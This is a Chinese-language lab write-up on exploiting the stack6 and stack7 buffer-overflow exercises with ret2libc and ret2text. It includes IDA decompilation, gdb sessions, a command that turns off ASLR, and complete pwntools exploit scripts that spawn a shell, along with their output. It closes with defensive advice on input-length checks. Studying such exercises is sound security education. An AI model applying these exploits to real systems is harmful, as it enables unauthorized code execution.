# <center>栈溢出实验4</center>

## 实验概述

### 【目的】
1. 运行stack6，反弹得到shell
2. 运行stack7，反弹得到shell
### 【环境】
Linux
### 【工具】
python,pwntools,gdb,core dump,IDA pro
### 【原理】
面向返回编程（英语：Return-Oriented Programming，缩写：ROP）是计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。攻击者控制堆栈调用以劫持程序控制流并执行针对性的机器语言指令序列（称为Gadgets）。 每一段gadget通常结束于return指令，并位于共享库代码中的子程序。系列调用这些代码，攻击者可以在拥有更简单攻击防范的程序内执行任意操作。
## 实验步骤

### 【步骤】
#### stack6
```
$ binwalk stack6

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             ELF, 32-bit LSB executable, Intel 80386, version 1 (SYSV)
```
打开IDA pro,定位到关键函数
```
int getpath()
{
  char s; // [sp+Ch] [bp-4Ch]@1
  unsigned int v2; // [sp+4Ch] [bp-Ch]@1
  unsigned int retaddr; // [sp+5Ch] [bp+4h]@1

  printf("input path please: ");
  fflush(_bss_start);
  gets(&s);
  v2 = retaddr;
  if ( (retaddr & 0xBF000000) == 0xBF000000 )
  {
    printf("bzzzt (%p)\n", v2);
    _exit(1);
  }
  return printf("got path %s\n", &s);
}
```
可以看到在`gets()`执行后，对ret地址进行了检查，若 `(retaddr & 0xBF000000) == 0xBF000000`则程序会直接退出，所以直接返回到栈上执行shellcode的方法就不能使用了。
上次实验我们提到过，shellcode的作用是调用c语言函数`excve('/bin/sh')`,这个函数调用也等价于`system('/bin/sh')`。下面我们在栈上伪造一个函数调用过程，来调用`system('/bin/sh')`。

根据函数调用栈，要想调用`system('/bin/sh')`，对于32位程序，需要把参数`/bin/sh`的地址压栈，我们需要输入以下的数据。
```
                   ------------------system('/bin/sh')
                  |                            |   
                  |                            |   
["aaaa"....][system_address]["bbbb"]['/bin/sh'.address]
```
这样就可以得到shell了，在此之前，需要先找到`system()`的地址和`/bin/sh`的地址。"bbbb"是调用`system("/bin/sh")`后的函数返回地址，但是在这之前我们就已经完成了目标，所以就可以随便填写了。
跟上一次实验一样，为了地址不产生变动，需要先关闭alsr保护。
```
sudo sh -c "echo 0 > /proc/sys/kernel/randomize_va_space"
```
使用gdb来查看`system()`的和`"/bin/sh"`的地址，注意，查看`system()`地址需要先在main函数下断点，执行后才能查找到，因为`system()`是动态共享库libc中的函数，需要在程序加载了libc之后才能查到具体地址。
```
$ gdb stack6
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from stack6...(no debugging symbols found)...done.
gdb-peda$ b main
Breakpoint 1 at 0x8048558
gdb-peda$ r
Starting program: /home/lometsj/prostar/stack6 

[----------------------------------registers-----------------------------------]
EAX: 0xf7fb7dbc --> 0xffffcfec --> 0xffffd1fb ("LC_PAPER=en_US.UTF-8")
EBX: 0x0 
ECX: 0xffffcf50 --> 0x1 
EDX: 0xffffcf74 --> 0x0 
ESI: 0xf7fb6000 --> 0x1afdb0 
EDI: 0xf7fb6000 --> 0x1afdb0 
EBP: 0xffffcf38 --> 0x0 
ESP: 0xffffcf34 --> 0xffffcf50 --> 0x1 
EIP: 0x8048558 (<main+14>:	sub    esp,0x4)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048554 <main+10>:	push   ebp
   0x8048555 <main+11>:	mov    ebp,esp
   0x8048557 <main+13>:	push   ecx
=> 0x8048558 <main+14>:	sub    esp,0x4
   0x804855b <main+17>:	call   0x80484cb <getpath>
   0x8048560 <main+22>:	mov    eax,0x0
   0x8048565 <main+27>:	add    esp,0x4
   0x8048568 <main+30>:	pop    ecx
[------------------------------------stack-------------------------------------]
0000| 0xffffcf34 --> 0xffffcf50 --> 0x1 
0004| 0xffffcf38 --> 0x0 
0008| 0xffffcf3c --> 0xf7e1e637 (<__libc_start_main+247>:	add    esp,0x10)
0012| 0xffffcf40 --> 0xf7fb6000 --> 0x1afdb0 
0016| 0xffffcf44 --> 0xf7fb6000 --> 0x1afdb0 
0020| 0xffffcf48 --> 0x0 
0024| 0xffffcf4c --> 0xf7e1e637 (<__libc_start_main+247>:	add    esp,0x10)
0028| 0xffffcf50 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048558 in main ()
gdb-peda$ print system
$1 = {<text variable, no debug info>} 0xf7e40940 <system>
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f5f02b ("/bin/sh")

```
可以看到 `system()`的地址是`0xf7e40940`
        `/bin/sh` 的地址是`0xf7f5f02b`

```
from pwn import *

io = process('./stack6')
payload = 'a'*80 + '\x40\x09\xe4\xf7'+ 'bbbb'+ '\x2b\xf0\xf5\xf7'
io.sendline(payload)
io.interactive()
```
```
$ python stack6.py
[+] Starting local process './stack6': pid 5355
[*] Switching to interactive mode
input path please: got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@    ��aaaaaaaaaaaa@    ��bbbb+���
$ echo i got it!
i got it!
$ exit
[*] Got EOF while reading in interactive
$ 
[*] Process './stack6' stopped with exit code -11 (SIGSEGV) (pid 5355)
[*] Got EOF while sending in interactive
```
成功。

#### stack7
```
$ binwalk stack7

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             ELF, 32-bit LSB executable, Intel 80386, version 1 (SYSV)

```
IDA pro定位到关键函数。
```
char *getpath()
{
  char s; // [sp+Ch] [bp-4Ch]@1
  unsigned int v2; // [sp+4Ch] [bp-Ch]@1
  unsigned int retaddr; // [sp+5Ch] [bp+4h]@1

  printf("input path please: ");
  fflush(_bss_start);
  gets(&s);
  v2 = retaddr;
  if ( (retaddr & 0xB0000000) == 0xB0000000 )
  {
    printf("bzzzt (%p)\n", v2);
    _exit(1);
  }
  printf("got path %s\n", &s);
  return strdup(&s);
}
.text:080484FB ; =============== S U B R O U T I N E =======================================
.text:080484FB
.text:080484FB ; Attributes: bp-based frame
.text:080484FB
.text:080484FB                 public getpath
.text:080484FB getpath         proc near               ; CODE XREF: main+11p
.text:080484FB
.text:080484FB s               = byte ptr -4Ch
.text:080484FB var_C           = dword ptr -0Ch
.text:080484FB
.text:080484FB                 push    ebp
.text:080484FC                 mov     ebp, esp
.text:080484FE                 sub     esp, 58h
.text:08048501                 sub     esp, 0Ch
.text:08048504                 push    offset format   ; "input path please: "
.text:08048509                 call    _printf
.text:0804850E                 add     esp, 10h
.text:08048511                 mov     eax, ds:__bss_start
.text:08048516                 sub     esp, 0Ch
.text:08048519                 push    eax             ; stream
.text:0804851A                 call    _fflush
.text:0804851F                 add     esp, 10h
.text:08048522                 sub     esp, 0Ch
.text:08048525                 lea     eax, [ebp+s]
.text:08048528                 push    eax             ; s
.text:08048529                 call    _gets
.text:0804852E                 add     esp, 10h
.text:08048531                 mov     eax, [ebp+4]
.text:08048534                 mov     [ebp+var_C], eax
.text:08048537                 mov     eax, [ebp+var_C]
.text:0804853A                 and     eax, 0B0000000h
.text:0804853F                 cmp     eax, 0B0000000h
.text:08048544                 jnz     short loc_8048563
.text:08048546                 sub     esp, 8
.text:08048549                 push    [ebp+var_C]
.text:0804854C                 push    offset aBzzztP  ; "bzzzt (%p)\n"
.text:08048551                 call    _printf
.text:08048556                 add     esp, 10h
.text:08048559                 sub     esp, 0Ch
.text:0804855C                 push    1               ; status
.text:0804855E                 call    __exit
.text:08048563 ; ---------------------------------------------------------------------------
.text:08048563
.text:08048563 loc_8048563:                            ; CODE XREF: getpath+49j
.text:08048563                 sub     esp, 8
.text:08048566                 lea     eax, [ebp+s]
.text:08048569                 push    eax
.text:0804856A                 push    offset aGotPathS ; "got path %s\n"
.text:0804856F                 call    _printf
.text:08048574                 add     esp, 10h
.text:08048577                 sub     esp, 0Ch
.text:0804857A                 lea     eax, [ebp+s]
.text:0804857D                 push    eax             ; s
.text:0804857E                 call    _strdup
.text:08048583                 add     esp, 10h
.text:08048586                 leave
.text:08048587                 retn
.text:08048587 getpath         endp
```
这里对ret地址的限制比上一题还要严格，因为`0xb & 0xf `的结果是`0xb`,所以返回`system()`也不能用了。通过观察IDA pro发现，text段的开头都是`0x08`，如果返回到text段就不会受到限制，思考过后，可以构造数据如下。

```
     ----------------------------------
    |                     ret          |
    |                      |           |           
    |                      |           |           
[shellcode]["aaaa"...][text_address][shellcode]
```
（其实这个构造对于stack6也是适用的）
从IDA pro的Text View窗口中可以找到ret指令的地址有`0x08048587`。
```
.text:08048586                 leave
.text:08048587                 retn
.text:08048587 getpath         endp
```
想好构造后就可以开始编写脚本了。
```
from pwn import *
#context.log_level = 'debug'
io = process('./stack7')
sc = asm(shellcraft.i386.sh())
payload = sc
payload += (80-len(sc))*'a'
payload += "\x87\x85\x04\x08"
payload += "\x1c\xcf\xff\xff"
io.sendline(payload)
io.interactive()
```
运行结果
```
$ python stack7.py
[+] Starting local process './stack7': pid 7737
[*] Switching to interactive mode
input path please: got path jhh///sh/bin\x89�h\x814$ri1�Qj\x04Y�Q��1�j\x0bX̀aaaaaaaaaaaaaaaaaaaa\x87\x85\x0aaaaaaaaaaaa\x87\x85\x0\x1c��\xff
$ echo u got it!
u got it!
$ exit
[*] Got EOF while reading in interactive
$ 
[*] Process './stack7' stopped with exit code 0 (pid 7737)
[*] Got EOF while sending in interactive

```
### 【总结】
本次实验熟悉了ret2libc和ret2text的栈溢出套路。
可以发现，要使栈溢出发生，要满足以下条件：
- 程序允许用户输入
- 程序对用户的输入长度不加检查

栈溢出攻击是最为普遍而又危害极大的漏洞，要防御栈溢出攻击，首先要有良好的编码功力，对于用户的输入数据要做严格的长度检查，避免使用危险的函数。